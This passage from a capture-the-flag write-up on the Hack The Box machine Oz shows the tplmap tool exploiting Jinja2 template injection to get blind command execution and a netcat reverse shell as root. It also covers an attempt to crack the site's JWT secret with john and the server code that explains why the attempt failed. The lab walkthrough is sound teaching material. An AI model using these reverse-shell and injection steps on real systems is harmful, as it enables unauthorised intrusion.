    (ALL) NOPASSWD: /usr/bin/docker network inspect *
    (ALL) NOPASSWD: /usr/bin/docker network ls
dorthi@Oz:~$ sudo su
root@Oz:/home/dorthi# id
uid=0(root) gid=0(root) groups=0(root)

```

## Beyond Root

### tplmap

In doing this write-up, I came across [tplmap](https://github.com/epinna/tplmap), which I had not noticed months ago when I first solved Oz. I think it’s worth walking through manually, so I left the main write-up showing those steps, but I also wanted to play with a new tool, and it works pretty well.

#### Install

Really easy, just clone the repo:

```

root@kali:/opt# git clone https://github.com/epinna/tplmap.git
Cloning into 'tplmap'...
remote: Enumerating objects: 88, done.
remote: Counting objects: 100% (88/88), done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 4059 (delta 39), reused 68 (delta 34), pack-reused 3971
Receiving objects: 100% (4059/4059), 639.25 KiB | 13.05 MiB/s, done.
Resolving deltas: 100% (2664/2664), done.

```

Now run it:

```

root@kali# /opt/tplmap/tplmap.py                     
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool  

Usage: python tplmap.py [options]

tplmap.py: error: URL is required. Run with -h for help. 

```

#### Run Against Oz

I’ll start by giving it the minimum parameters to get it going:
- `-u` - the url to target
- `-X POST` - the request type
- `-d` - the data for the POST
- `-H` - headers to include, in this case, the cookie to be logged in

On doing that, it finds the engine, Jinja2 (same as I found above), and says it can do blind shell commands and file writes. For some reason it thinks it can’t do file reads, which I proved I could do above, so it’s not perfect.

```

root@kali# /opt/tplmap/tplmap.py -u http://10.10.10.96:8080/ -X POST -d "name=GBR-4045&desc=test" -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI
6MTU0Njc0MDEwMX0._vYHq7D4Cq9eSMI5UTQRC4lM9BjB0DAmvFZy0ZJ664w"
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin is testing blind injection
[+] Jinja2 plugin has confirmed blind injection
[+] Tplmap identified the following injection point:

  POST parameter: name
  Engine: Jinja2
  Injection: *
  Context: text
  OS: undetected
  Technique: blind
  Capabilities:

   Shell command execution: ok (blind)
   Bind and reverse shell: ok
   File write: ok (blind)
   File read: no
   Code evaluation: ok, python code (blind)

[+] Rerun tplmap providing one of the following options:
    --os-shell                          Run shell on the target
    --os-cmd                    Execute shell commands
    --bind-shell PORT                   Connect to a shell bind to a target port
    --reverse-shell HOST PORT   Send a shell back to the attacker's port
    --upload LOCAL REMOTE       Upload files to the server

```

I tried ramping the `--level` up to 5 (default 1), but still failed to read files.

I did try the various shell options. The blind os shell option did in fact run commands:

```

root@kali# /opt/tplmap/tplmap.py -u http://10.10.10.96:8080/ -X POST -d "name=GBR-4045&desc=test" -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU0Njc0MDEwMX0._vYHq7D4Cq9eSMI5UTQRC4lM9BjB0DAmvFZy0ZJ664w" -e Jinja2 --os-shell

...[snip]...

[+] Blind injection has been found and command execution will not produce any output.
[+] Delay is introduced appending '&& sleep <delay>' to the shell commands. True or False is returned whether it returns successfully or not.
[+] Run commands on the operating system.
 (blind) $ ping -c 1 10.10.14.15

```

```

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
20:59:37.681992 IP 10.10.10.96 > kali: ICMP echo request, id 40458, seq 0, length 64
20:59:37.682017 IP kali > 10.10.10.96: ICMP echo reply, id 40458, seq 0, length 64

```

The `--reverse-shell` option worked. It gave me a weird error about not being able to bind on 0.0.0.0:[whatever port I gave it], even though it was supposed to a reverse shell… and the reverse shell worked:

```

root@kali# nc -lnvp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.96.
Ncat: Connection from 10.10.10.96:43747.
/bin/sh: can't access tty; job control turned off
/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

```

That’s pretty neat.

I did notice that the reverse shell command tended to hang and be really difficult to kill. Not sure why…

### JWT

#### Trying to Break

One path I went down that didn’t work out was to attack the JSON Web Token that the ticket site used.

On logging in, I’m given a cookie:

```

Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU0MTI3MjQwNX0.qod_CSOLAsVDYRof2wC7p0Va0bq8aXCc9R4e1epCdm4

```

I’ll recognized that as a JWT. JWTs contain encoded information, and are signed by a key. So as an attacker, I can see the info, but I can’t change it without knowing the key used to sign it, which typically is a password.

The best way to quickly validate that is a JWT and see what it contains is to go to http://jwt.io, and input the cookie:

![1541328905003](https://0xdfimages.gitlab.io/img/1541328905003.png)

I don’t know the secret here, but like any cryptographic algorithm, I can try to brute force it, to see if the password is guessable.

In the [2017 Sans Holiday Hack Challenge](https://www.holidayhackchallenge.com/2017/) (oddly enough also Wizard of Oz-themed), I had to break a JWT, and I did it with `john`:

```

root@kali# python jwt2john.py
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZi
IsImV4cGlyZXMiOiIyMDE3LTA4LT
E2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3Ct
rWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I > jwt.john

root@kali# /opt/JohnTheRipper/run/john jwt.john
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3lv3s
(?)
1g 0:00:01:46 DONE 3/3 (2017-12-30 16:03) 0.009361g/s 2991Kp/s 2991Kc/s
2991KC/s 3k3ys..mo_tl
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

But in this case, I wasn’t able to crack the password.

#### Why I Couldn’t Break

Once I got a shell, I was able to take a look at the code for the site:

```

/app/ticketer # cat auth.py
#!/usr/bin/python2.7
# -*- coding:utf-8 -*-
from passlib.hash import pbkdf2_sha256
from . import database
import jwt
import os
import datetime

secret = os.urandom(30)

def check_user(username, password):
    try:
        user_acc = database.Users.query.filter_by(username=username).first()
        if pbkdf2_sha256.verify(password, user_acc.password):
            return True
        else:
            return False
    except Exception:
        return False

def create_cookie(username):
    return jwt.encode({'username': username, 'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=30) }, secret)                                                                                     

def decrypt_cookie(cookie):
    try:
        jwt.decode(cookie, secret)
        return True
    except Exception:
        return False

```

Right at the start of the script, the secret is definted as 30 bytes of randomness. No wonder rockyou didn’t crack it.